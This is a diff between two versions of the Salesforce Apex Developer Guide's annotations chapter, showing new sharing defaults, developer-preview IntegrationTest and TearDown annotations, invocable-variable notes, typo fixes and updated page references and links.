+We recommend that you always include an explicit sharing declaration on Apex classes that include database operations or SOQL queries.
+This practice promotes intentionality and increases code maintainability.
 
-Regardless of the sharing mode, object-level access and field-level security aren’t enforced by Apex. You must enforce object-level access
-and field-level security in your SOQL queries or code. For example, `with sharing` mechanism doesn’t enforce user’s access to view
-reports and dashboards. You must explicitly enforce the running user’s CRUD (Create, Read, Update, Delete) and field-level security in
-your code. See Enforcing Object and Field Permissions.
+Versioned Behavior Changes
+
+In API version 67.0 and later, classes without an explicit sharing declaration run in `with sharing` mode.
+
+In API version 66.0 and earlier, the sharing mode of classes without an explicit sharing declaration is determined according these factors.
+
+**•** If the class is part of an inheritance chain, and any class in that chain is saved as API version 67.0 and later, the class runs in `with`
+`sharing` mode.
+
+**•** If the class is an Aura controller or an `@AuraEnabled` method called from a Lightning web component, the class runs in `with`
+`sharing` mode.
+
+**•** Otherwise, the class runs in `without sharing` mode.
+
+**•** If the class isn’t an Apex entry point, its sharing mode is defined by the sharing mode of the calling class.
 
 #### Annotations
 
 An Apex annotation modifies the way that a method or class is used, similar to annotations in Java. Annotations are defined with an
 initial `@` symbol, followed by the appropriate keyword.
 
-To add an annotation to a method, specify it immediately before the method or class definition. For example:
-
-```
-global class MyClass {
-
-   @Future
-
-   Public static void myMethod(String a)
-
-   {
-
-      //long-running Apex code
-
-```
-
 
 Apex Developer Guide Classes, Objects, and Interfaces
 
+To add an annotation to a method, specify it immediately before the method or class definition. For example:
+
 ```
+   global class MyClass {
+
+      @Future
+
+      Public static void myMethod(String a)
+
+      {
+
+         //long-running Apex code
+
       }
 
    }
@@ -6950,47 +6955,54 @@ You can use multiple annotations for the same class or method. Specify each anno
 or method definition. Some annotations can’t be used together. If applicable, these limitations are documented on the page for the
 annotation.
 
-1. AuraEnabled Annotation Annotation
+1. AuraEnabled Annotation
 
-2. Deprecated Annotation Annotation
+2. Deprecated Annotation
 
 3. Future Annotation
 Use the `Future` annotation to identify methods that run asynchronously. A future method runs when Salesforce has available
 resources.
 
-4. InvocableMethod Annotation
-Use the `InvocableMethod` annotation to identify methods that can be run as invocable actions.
-
-5. InvocableVariable Annotation
-To identify variables used by invocable methods in custom classes, use the `InvocableVariable` annotation.
-
-6. IsTest Annotation
-
 
 Apex Developer Guide Classes, Objects, and Interfaces
 
-7. JsonAccess Annotation
+4. IntegrationTest Annotation (Developer Preview)
+Use the `IntegrationTest` annotation to mark both classes and methods that are used in integration testing.
+
+5. InvocableMethod Annotation
+Use the `InvocableMethod` annotation to identify methods that can be run as invocable actions.
+
+6. InvocableVariable Annotation
+To identify variables used by invocable methods in custom classes, use the `InvocableVariable` annotation.
+
+7. IsTest Annotation
+
+8. JsonAccess Annotation
 The `@JsonAccess` annotation defined at Apex class level controls whether instances of the class can be serialized or deserialized.
 If the annotation restricts the JSON or XML serialization and deserialization, a runtime `JSONException` exception is thrown.
 
-8. NamespaceAccessible Annotation Annotation
+9. NamespaceAccessible Annotation
 
-9. ReadOnly Annotation Annotation
+10. ReadOnly Annotation
 
-10. RemoteAction Annotation Annotation
+11. RemoteAction Annotation
 
-11. SuppressWarnings Annotation Annotation
+12. SuppressWarnings Annotation
 
 This annotation does nothing in Apex but can be used to provide information to third-party tools.
 
-12. TestSetup Annotation Annotation
+13. TestSetup Annotation
 
 Methods defined with the `@TestSetup` annotation are used for creating common test records that are available for all test
 methods in the class.
 
-13. TestVisible Annotation Annotation
+14. TearDown Annotation (Developer Preview)
 
-##### AuraEnabled Annotation Annotation
+Use the `TearDown` annotation to mark a cleanup method that runs after the test completes, regardless of pass or fail.
+
+15. TestVisible Annotation
+
+##### AuraEnabled Annotation
 
 The `@AuraEnabled` annotation enables client-side and server-side access to an Apex controller method. Providing this annotation
 makes your methods available to your Lightning components (both Lightning web components and Aura components). Only methods
@@ -7003,17 +7015,20 @@ Using this annotation eliminates the need to call `setStorable()` in JavaScript 
 In API version 55.0 and later, you can use the annotation `@AuraEnabled(cacheable=true scope='global')` to enable
 Apex methods to be cached in a global cache.
 
-[For more information, see Lightning Aura Components Developer Guide and Lightning Web Components Developer Guide.](https://developer.salesforce.com/docs/atlas.en-us.260.0.lightning.meta/lightning/)
+[For more information, see Lightning Aura Components Developer Guide and Lightning Web Components Developer Guide.](https://developer.salesforce.com/docs/atlas.en-us.262.0.lightning.meta/lightning/)
 
 Versioned Behavior Changes
 
 In API version 55.0 and later, overloads aren’t allowed on methods annotated with `@AuraEnabled` .
 
-##### Deprecated Annotation Annotation Use the Deprecated annotation to identify methods, classes, exceptions, enums, interfaces, or variables that can no longer be
+##### Deprecated Annotation Use the Deprecated annotation to identify methods, classes, exceptions, enums, interfaces, or variables that can no longer be
 
 referenced in subsequent releases of the managed package in which they reside. This annotation is useful when you’re refactoring code
 in managed packages as the requirements evolve. New subscribers can’t see the deprecated elements, while the elements continue to
 function for existing subscribers and API integrations.
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 The following code snippet shows a deprecated method. The same syntax can be used to deprecate classes, exceptions, enums, interfaces,
 or variables.
@@ -7033,9 +7048,6 @@ Note the following rules when deprecating Apex identifiers:
 
 **•** Unmanaged packages can’t contain code that uses the `deprecated` keyword.
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 **•** When an Apex item is deprecated, all `global` access modifiers that reference the deprecated identifier must also be deprecated.
 Any global method that uses the deprecated type in its signature, either in an input argument or the method return type, must also
 be deprecated. A deprecated item, such as a method or a class, can still be referenced internally by the package developer.
@@ -7051,7 +7063,7 @@ be deprecated. A deprecated item, such as a method or a class, can still be refe
 **•** You can’t remove the `Deprecated` annotation to undeprecate something in Apex after you’ve released a package version where
 that item in Apex is deprecated.
 
-For more information about package versions, see Managed Package Types on page 751.
+For more information about package versions, see Managed Package Types on page 766.
 
 ##### Future Annotation Use the Future annotation to identify methods that run asynchronously. A future method runs when Salesforce has available resources.
 
@@ -7091,6 +7103,9 @@ take sObjects or objects as arguments.
 
 from making callouts.
 
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
 The following snippet shows how to specify that a method executes a callout:
 
 ```
@@ -7106,18 +7121,27 @@ The following snippet shows how to specify that a method executes a callout:
 
 Future Method Considerations
 
-##### • Remember that any method that uses the Future annotation requires special consideration because the method doesn’t necessarily
-
+**•** Remember that any method that uses the `Future` annotation requires special consideration because the method doesn’t necessarily
 execute in the same order that it’s called in.
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
 
 **•** Methods with the `Future` annotation can’t be used in Visualforce controllers in either `get` _**`MethodName`**_ or `set` _**`MethodName`**_
 methods, nor in the constructor.
 
 **•** You can’t call a method annotated with `Future` from a method that also has the `Future` annotation. Nor can you call a trigger
 from an annotated method that calls another annotated method.
+
+##### IntegrationTest Annotation (Developer Preview) Use the IntegrationTest annotation to mark both classes and methods that are used in integration testing.
+
+Note: The Apex Integration Tests feature is available as a developer preview in scratch orgs in Summer ’26 (API version 67.0). The
+feature isn’t generally available unless or until Salesforce announces its general availability in documentation or in press releases
+or public statements. All commands, parameters, and other features are subject to change or deprecation at any time, with or
+without notice. Don't implement functionality developed with these commands or tools in your production package.
+
+A class annotated with @IntegrationTest can only contain integration test methods and @TearDown methods. You can't mix
+@IntegrationTest and @IsTest annotations on the same class.
+
+Integration test methods cannot be called from non-test contexts or from @IsTest test methods. However, integration tests can call
+methods in @IsTest utility classes, for example, shared test data factories.
 
 ##### InvocableMethod Annotation Use the InvocableMethod annotation to identify methods that can be run as invocable actions.
 
@@ -7152,6 +7176,12 @@ This code sample shows an invocable method with primitive data types.
 
        FROM Account
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
        WHERE Id IN :ids
 
        WITH USER_MODE
@@ -7205,12 +7235,6 @@ This code sample shows an invocable method with a specific sObject data type.
 
       Database.SaveResult[] results = Database.insert(
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
        accounts,
 
        false,
@@ -7260,6 +7284,12 @@ This code sample shows an invocable method with the generic sObject data type.
 
        SObject outputMember = inputCollection[0];
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
        //Create a Results object to hold the return values
 
        Results result = new Results();
@@ -7306,12 +7336,6 @@ This code sample shows an invocable method with the generic sObject data type.
 
        required=true
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
       )
 
       public SObject outputMember;
@@ -7363,6 +7387,9 @@ This code sample shows an invocable method with a custom icon from the Salesforc
 To handle exceptions within an invocable method, wrap the results in an Apex object that reports failures. The execution of the invocable
 method must run and return the same number of results as inputs received even if errors occur.
 
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
 For example, this code sample adjusts positive values by taking their square root and multiplying by pi, setting a success flag to `true` .
 For negative values, it sets the success flag to `false` .
 
@@ -7407,12 +7434,6 @@ For negative values, it sets the success flag to `false` .
 
        }
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
        results.add(result);
 
       }
@@ -7464,6 +7485,12 @@ This test method checks whether the value adjustments were successful and verifi
 
       values.add(1);
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
       Test.startTest();
 
       // Call the doAdjustment method with the test values.
@@ -7497,9 +7524,6 @@ This test method checks whether the value adjustments were successful and verifi
 Supported Modifiers
 
 All modifiers are optional.
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
 
 **label**
 The label for the method, which appears as the action name in Flow Builder. The default is the method name, though we recommend
@@ -7539,6 +7563,9 @@ InvocableMethod Considerations
 
 **•** The invocable method must be `static` and `public` or `global`, and its class must be an outer class.
 
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
 **•** Only one method in a class can have the `InvocableMethod` annotation.
 
 **•** The only annotation that can be used with the `InvocableMethod` annotation is `Deprecated` .
@@ -7556,6 +7583,10 @@ There can be at most one input parameter and its data type must be one of the fo
 `InvocableVariable` annotation. To implement your data type, create a custom global or public Apex class. The class
 must contain at least one member variable with the invocable variable annotation.
 
+Note: `@InvocableVariable` fields of type `List<List<sObject>>` are not supported in user-defined Apex
+classes and cause a runtime error. Use `List<List<sObject>>` only as a direct `@InvocableMethod` return
+type.
+
 If the return type isn’t `Null`, the data type returned by the method must be one of the following:
 
 **•** A list of a primitive data type or a list of lists of a primitive data type – the generic `Object` type isn’t supported.
@@ -7568,12 +7599,13 @@ If the return type isn’t `Null`, the data type returned by the method must be 
 `InvocableVariable` annotation. To implement your data type, create a custom global or public Apex class. The class
 must contain at least one member variable with the invocable variable annotation.
 
+Note: `@InvocableVariable` fields of type `List<List<sObject>>` are not supported in user-defined Apex
+classes and cause a runtime error. Use `List<List<sObject>>` only as a direct `@InvocableMethod` return
+type.
 
-Apex Developer Guide Classes, Objects, and Interfaces
-
-Note: For a correct bulkification implementation, the Inputs and Outputs must match on both the size and the order. For
-example, the i-th Output entry must correspond to the i-th Input entry. Matching entries are required for data correctness
-when your action is in bulkified execution, such as when an apex action is used in a record trigger flow.
+For a correct bulkification implementation, the Inputs and Outputs must match on both the size and the order. For example, the
+i-th Output entry must correspond to the i-th Input entry. Matching entries are required for data correctness when your action is in
+bulkified execution, such as when an apex action is used in a record trigger flow.
 
 **Managed Packages**
 
@@ -7583,21 +7615,24 @@ the package.
 **•** Public invocable methods can be referred to by flows and processes within the managed package.
 
 **•** Global invocable methods can be referred to anywhere in the subscriber org. Only global invocable methods appear in Flow
-Builder and Process Builder in the subscriber org. See Best Practices for Using Global Apex in Managed Packages on page 757.
+Builder and Process Builder in the subscriber org. See Best Practices for Using Global Apex in Managed Packages on page 773.
 
-[For more information about invocable actions, see Apex Actions in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.api_action.meta/api_action/actions_intro.htm) _Actions Developer Guide_ .
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+[For more information about invocable actions, see Apex Actions in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_action.meta/api_action/actions_intro.htm) _Actions Developer Guide_ .
 
 SEE ALSO:
 
 ##### InvocableVariable Annotation
 
-_[Actions Developer Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.api_action.meta/api_action/actions_obj_apex.htm)_ : Apex Actions
+_[Actions Developer Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_action.meta/api_action/actions_obj_apex.htm)_ : Apex Actions
 
-_[REST API Developer Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.api_rest.meta/api_rest/resources_actions_invocable.htm)_ : Invocable Actions
+_[REST API Developer Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_rest.meta/api_rest/resources_actions_invocable.htm)_ : Invocable Actions
 
 _Salesforce Help_ [: Add a Custom Icon to an Apex-Defined Action](https://help.salesforce.com/s/articleView?id=platform.flow_build_extend_apex_type_add_a_custom_icon.htm&type=5&language=en_US)
 
-_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_Invocable_Action.htm)_ : Action Class
+_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_Invocable_Action.htm)_ : Action Class
 
 _Lightning Web Components Developer Guide_ [: Develop Custom Property Editors for Flow Builder](https://developer.salesforce.com/docs/component-library/documentation/en/lwc/lwc.use_flow_custom_property_editor)
 
@@ -7605,7 +7640,7 @@ _Prompt Builder_ [: Ground with Apex](https://help.salesforce.com/s/articleView?
 
 Making Callouts to External Systems from Invocable Actions
 
-Customize Invocable Action Input Order in Flow Builder
+Extend Invocable Action Configuration in Flow Builder
 
 ##### InvocableVariable Annotation To identify variables used by invocable methods in custom classes, use the InvocableVariable annotation. The InvocableVariable annotation identifies a class variable used as an input or output parameter for an InvocableMethod
 
@@ -7643,12 +7678,6 @@ This code sample shows an invocable method with invocable variables.
 
       lc.setConvertedStatus(request.convertedStatus);
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
       if (request.accountId != null) {
 
         lc.setAccountId(request.accountId);
@@ -7667,6 +7696,12 @@ Apex Developer Guide Classes, Objects, and Interfaces
 
       }
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
       if (request.createOpportunity != null && !request.createOpportunity) {
 
        lc.setDoNotCreateOpportunity(!request.createOpportunity);
@@ -7733,12 +7768,6 @@ Apex Developer Guide Classes, Objects, and Interfaces
 
       @InvocableVariable
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
       global Boolean overWriteLeadSource;
 
       @InvocableVariable
@@ -7755,6 +7784,12 @@ Apex Developer Guide Classes, Objects, and Interfaces
 
       @InvocableVariable
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
       global Boolean sendEmailToOwner;
 
      }
@@ -7822,12 +7857,6 @@ This code sample shows an invocable method with invocable variables that have th
 
      }
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
    public class Results {
 
      @InvocableVariable(label=' Records for Output ' description=' yourDescription '
@@ -7846,11 +7875,14 @@ Supported Modifiers
 
 All modifiers are optional.
 
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
 Tip: Default values, labels, and placeholder text appear in Flow Builder for the Action element that corresponds to an invocable
 method. These modifiers help admins understand how to use variables in the flow.
 
 **defaultValue**
-Provide a vaule to the action at runtime, if no value is provided then these default values are provided to the action at runtime.
+Provide a value to the action at runtime, if no value is provided then these default values are provided to the action at runtime.
 Valid invocable variable data types are:
 
 **•** Boolean - fields must have a value of `'true'` or `'false'` and case-insensitive.
@@ -7880,7 +7912,7 @@ Valid invocable variable data types are:
 
 ```
 
-**•** Integer - fields must have a value of `'validIntegerValue'` where the inter value can’t have a suffix.
+**•** Integer - fields must have a value of `'validIntegerValue'` where the integer value can’t have a suffix.
 
 ```
        @InvocableVariable(defaultValue='-214')
@@ -7913,16 +7945,13 @@ The description for the variable. The default is `Null` .
 **label**
 The label for the variable. The default is the variable name.
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 **placeholderText**
 Provides examples or additional guidance about the invocable variable, such as examples of values that can set the invocable variable.
 Valid invocable variable data types are:
 
 **•** Double - fields must have a value of `'validDoubleValue'` where the d suffix is required and case-insensitive.
 
-**•** Integer - fields must have a value of `'validIntegerValue'` where the inter value can’t have a suffix.
+**•** Integer - fields must have a value of `'validIntegerValue'` where the integer value can’t have a suffix.
 
 **•** String - fields can use any valid string value including the empty string.
 
@@ -7930,6 +7959,9 @@ Valid invocable variable data types are:
 Specifies whether the variable is required. If not specified, the default is `false` . The value is ignored for output variables.
 
 Note: The `defaultValue` modifier throws an error when used with `required` .
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 Example: The invocable variable annotation supports the modifiers shown in this example.
 
@@ -7973,7 +8005,9 @@ InvocableVariable Considerations
 
 **–** An sObject, either the generic sObject or a specific sObject
 
-**–** A list or a list of lists of primitives, sObjects, objects created from Apex classes, or collections
+**–** A list of primitives, sObjects, or objects created from Apex classes
+
+**–** A list of lists of primitives or objects created from Apex classes
 
 **•** The invocable variable name in Apex must match the name in the flow. The name is case-sensitive.
 
@@ -7981,24 +8015,28 @@ InvocableVariable Considerations
 
 **–** Public invocable variables can be set in flows and processes within the same managed package.
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 **–** Global invocable variables can be set anywhere in the subscriber org. Only global invocable variables appear in Flow Builder and
 Process Builder in the subscriber org.
 
+**•** Starting in API version 66.0, Apex classes used for invocable action parameters must have a visible no-argument constructor. Use
+the default constructor or add your own constructor. The constructor must be public for non-packaged classes or global for packaged
+classes invoked from outside the package. See Using Constructors on page 68.
+
 SEE ALSO:
 
-_Apex Developer Guide_ [: InvocableMethod Annotation](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_classes_annotation_InvocableMethod.htm)
+_Apex Developer Guide_ [: InvocableMethod Annotation](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_classes_annotation_InvocableMethod.htm)
 
-_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_Invocable_Action.htm)_ : Action Class
+_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_Invocable_Action.htm)_ : Action Class
 
-Customize Invocable Action Input Order in Flow Builder
+Extend Invocable Action Configuration in Flow Builder
 
 ##### IsTest Annotation
 
 Use the `@IsTest` annotation to define classes and methods that only contain code used for testing your app. The annotation can
 take multiple modifiers within parentheses and separated by blanks.
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 Note: The `@IsTest` annotation on methods is equivalent to the `testMethod` keyword. As best practice, Salesforce
 recommends that you use `@IsTest` rather than `testMethod` . The `testMethod` keyword may be versioned out in a future
@@ -8057,12 +8095,6 @@ Here’s an example of a public test class that contains utility methods for tes
 
      }
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
    }
 
 ```
@@ -8078,7 +8110,10 @@ For Apex code saved using Salesforce API version 24.0 and later, use the `@IsTes
 classes and individual test methods access to all data in the organization. The access includes pre-existing data that the test didn’t create.
 Starting with Apex code saved using Salesforce API version 24.0, test methods don’t have access to pre-existing data in the organization.
 However, test code saved against Salesforce API version 23.0 and earlier continues to have access to all data in the organization. See
-Isolation of Test Data from Organization Data in Unit Tests on page 720.
+Isolation of Test Data from Organization Data in Unit Tests on page 727.
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 **Considerations for the** **`@IsTest(SeeAllData=true)`** **Annotation**
 
@@ -8138,12 +8173,6 @@ class have access to all data in the organization.
 
       }
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
       // Like the previous method, this test method can also access all data
 
       // because the containing class is annotated with @IsTest(SeeAllData=true).
@@ -8162,6 +8191,10 @@ Apex Developer Guide Classes, Objects, and Interfaces
 
 This second example shows how to apply the `@IsTest(SeeAllData=true)` annotation on a test method. Because the test
 method’s class isn’t annotated, you have to annotate the method to enable access to all data for the method. The second test method
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
 doesn’t have this annotation, so it can access only the data it creates. In addition, it can access objects that are used to manage your
 organization, such as users.
 
@@ -8229,9 +8262,6 @@ pass in order for the package installation to succeed. It’s no longer possible
 method or a class that doesn't have this annotation, or that is annotated with `@IsTest(OnInstall=false)` or `@IsTest`, isn’t
 executed during installation.
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 Tests annotated with `IsTest(OnInstall=true)` that run during package install and upgrade aren’t counted towards code
 coverage. However, code coverage is tracked and counted during a package creation operation. Because Apex code installed from a
 managed package is excluded from org level requirements for code coverage, it’s unlikely that you’re affected. But, if you track managed
@@ -8248,6 +8278,12 @@ but `test2` and `test3` isn’t.
 
      public void method1(){
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
        // Some code
 
      }
@@ -8314,9 +8350,6 @@ same Apex method.
 
 **•** Tests can’t insert a ContentNote SObject.
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 **•** Tests can’t create User or GroupMember SObjects.
 
 **•** Tests can’t use the SObjects that are listed in sObjects That Can't Be Used Together in DML Operations.
@@ -8328,7 +8361,10 @@ are subject to the Beta Services Terms at Agreements — Salesforce.com or a wri
 Customer, and applicable terms in the Product Terms Directory. Use of these pilot or beta services are at the Customer’s sole
 discretion.
 
-If you set the deployment test level to `[RunRelevantTests](https://developer.salesforce.com/docs/atlas.en-us.260.0.api_meta.meta/api_meta/meta_deploy_run_relevant_tests.htm)`, use the `@IsTest(critical=true)` annotation to guarantee
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+If you set the deployment test level to `[RunRelevantTests](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_meta.meta/api_meta/meta_deploy_run_relevant_tests.htm)`, use the `@IsTest(critical=true)` annotation to guarantee
 that the test class always runs during deployments, regardless of the deployment payload. This annotation is available at the test class
 level in Salesforce API version 66.0 and later. Using this annotation on a test method results in a compilation error.
 
@@ -8353,7 +8389,7 @@ are subject to the Beta Services Terms at Agreements — Salesforce.com or a wri
 Customer, and applicable terms in the Product Terms Directory. Use of these pilot or beta services are at the Customer’s sole
 discretion.
 
-If you set the deployment test level to `[RunRelevantTests](https://developer.salesforce.com/docs/atlas.en-us.260.0.api_meta.meta/api_meta/meta_deploy_run_relevant_tests.htm)`, use the `@IsTest(testFor='...')` annotation to guarantee
+If you set the deployment test level to `[RunRelevantTests](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_meta.meta/api_meta/meta_deploy_run_relevant_tests.htm)`, use the `@IsTest(testFor='...')` annotation to guarantee
 that the tests in the class run whenever the deployment includes new or modified versions of the referenced Apex components. This
 annotation is available at the test class level in Salesforce API version 66.0 and later. Using this annotation on a test method results in a
 compilation error.
@@ -8383,9 +8419,6 @@ in the deployment payload.
 The `@JsonAccess` annotation defined at Apex class level controls whether instances of the class can be serialized or deserialized. If
 the annotation restricts the JSON or XML serialization and deserialization, a runtime `JSONException` exception is thrown.
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 The `serializable` and `deserializable` parameters of the `@JsonAccess` annotation enforce the contexts in which Apex
 allows serialization and deserialization. You can specify one or both parameters, but you can’t specify the annotation with no parameters.
 The valid values for the parameters to indicate whether serialization and deserialization are allowed:
@@ -8397,6 +8430,9 @@ The valid values for the parameters to indicate whether serialization and deseri
 **•** `samePackage` : allowed only for Apex code in the same package (impacts only second-generation packages)
 
 **•** `always` : always allowed for any Apex code
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 This example code shows an Apex class marked with the `@JsonAccess` annotation.
 
@@ -8433,14 +8469,14 @@ In versions 48.0 and earlier, the default access for deserialization is `always`
 to preserve the existing behavior. From version 49.0 onwards, the default access for both serialization and deserialization is
 `sameNamespace` .
 
-##### NamespaceAccessible Annotation Annotation
+##### NamespaceAccessible Annotation
 
 The `@NamespaceAccessible` makes public Apex in a package available to other packages that use the same namespace. Without
 this annotation, Apex classes, methods, interfaces, properties, and abstract classes defined in a 2GP package aren’t accessible to the
 other packages with which they share a namespace. Apex that is declared global is always available across all namespaces, and needs
 no annotation.
 
-[For more information on 2GP managed packages, see Second-Generation Managed Packages in](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_dev2gp.htm) _Salesforce DX Developer Guide_ .
+[For more information on 2GP managed packages, see Second-Generation Managed Packages in](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_dev2gp.htm) _Salesforce DX Developer Guide_ .
 
 Considerations for Apex Accessibility Across Packages
 
@@ -8449,9 +8485,6 @@ Apex method.
 
 **•** You can add or remove the `@NamespaceAccessible` annotation at any time, even on managed and released Apex code.
 Make sure that you don’t have dependent packages relying on the functionality of the annotation before adding or removing it.
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
 
 **•** When adding or removing `@NamespaceAccessible` Apex from a package, consider the impact to customers with installed
 versions of other packages that reference this package’s annotation. Before pushing a package upgrade, ensure that no customer
@@ -8462,6 +8495,9 @@ interface members can’t be annotated with `@NamespaceAccessible` .
 
 **•** If a public or protected variable or method is declared as `@NamespaceAccessible`, its defining class must be either global or
 public with the `@NamespaceAccessible` annotation.
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 **•** If a public or protected inner class is declared as `@NamespaceAccessible`, its enclosing class must be either global or public
 with the `@NamespaceAccessible` annotation.
@@ -8540,9 +8576,6 @@ Therefore, this behavior isn’t allowed.
 
 ```
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 But this behavior is allowed.
 
 ```
@@ -8558,6 +8591,12 @@ But this behavior is allowed.
 
       }
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
    }
 
    // In Package2 in the Acme namespace
@@ -8580,9 +8619,9 @@ But this behavior is allowed.
 
 In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
 annotated with `@NamespaceAccessible` . For accessibility considerations, see Considerations for Apex Acessibility Across Packages.
-[For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
+[For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
 
-##### ReadOnly Annotation Annotation
+##### ReadOnly Annotation
 
 The `@ReadOnly` annotation allows you to perform less restrictive queries against the Lightning Platform database by increasing the
 limit of the number of returned rows for a request to 1,000,000. All other limits still apply. The annotation blocks the following operations
@@ -8597,7 +8636,7 @@ Visualforce pages can call controller methods with the `@ReadOnly` annotation, a
 restrictions. To increase other Visualforce-specific limits, such as the size of a collection that can be used by an iteration component like
 
 `<apex:pageBlockTable>`, you can set the `readonly` attribute on the `<apex:page>` tag to `true` . For more information,
-[see Working with Large Sets of Data in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.pages.meta/pages/pages_controller_readonly_context.htm) _[Visualforce Developer's Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.pages.meta/pages/)_ .
+[see Working with Large Sets of Data in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.pages.meta/pages/pages_controller_readonly_context.htm) _[Visualforce Developer's Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.pages.meta/pages/)_ .
 
 Versioned Behavior Changes
 
@@ -8605,14 +8644,11 @@ Prior to API version 49.0, using `@ReadOnly` on Apex REST methods (@HttpDelete, 
 also required annotating the method with `@RemoteAction` . In API version 49.0 and later, you can annotate Apex REST methods
 with just `@ReadOnly` .
 
-##### RemoteAction Annotation Annotation The RemoteAction annotation provides support for Apex methods used in Visualforce to be called via JavaScript. This process is
+##### RemoteAction Annotation The RemoteAction annotation provides support for Apex methods used in Visualforce to be called via JavaScript. This process is
 
 often referred to as JavaScript remoting.
 
 ##### Note: Methods with the RemoteAction annotation must be static and either global or public .
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
 
 Add the Apex class as a custom controller or a controller extension to your page.
 
@@ -8624,6 +8660,9 @@ Add the Apex class as a custom controller or a controller extension to your page
 Warning: Adding a controller or controller extension grants access to all `@RemoteAction` methods in that Apex class, even
 if those methods aren’t used in the page. Anyone who can view the page can execute all `@RemoteAction` methods and
 provide fake or malicious data to the controller.
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 Then, add the request as a JavaScript function call. A simple JavaScript remoting invocation takes the following form.
 
@@ -8660,19 +8699,19 @@ actual type. Your method can return Apex primitives, sObjects, collections, user
 
 For more information, see “JavaScript Remoting for Apex Controllers” in the _Visualforce Developer's Guide_ .
 
-##### SuppressWarnings Annotation Annotation
+##### SuppressWarnings Annotation
 
 This annotation does nothing in Apex but can be used to provide information to third-party tools.
 
 The `@SuppressWarnings` annotation does nothing in Apex but can be used to provide information to third-party tools.
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-##### TestSetup Annotation Annotation
+##### TestSetup Annotation
 
 Methods defined with the `@TestSetup` annotation are used for creating common test records that are available for all test methods
 in the class.
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 Syntax
 
@@ -8699,7 +8738,18 @@ Because data isolation for tests is available for API versions 24.0 and later, t
 
 For more information, see Using Test Setup Methods.
 
-##### TestVisible Annotation Annotation Use the TestVisible annotation to allow test methods to access private or protected members of another class outside the test
+##### TearDown Annotation (Developer Preview) Use the TearDown annotation to mark a cleanup method that runs after the test completes, regardless of pass or fail.
+
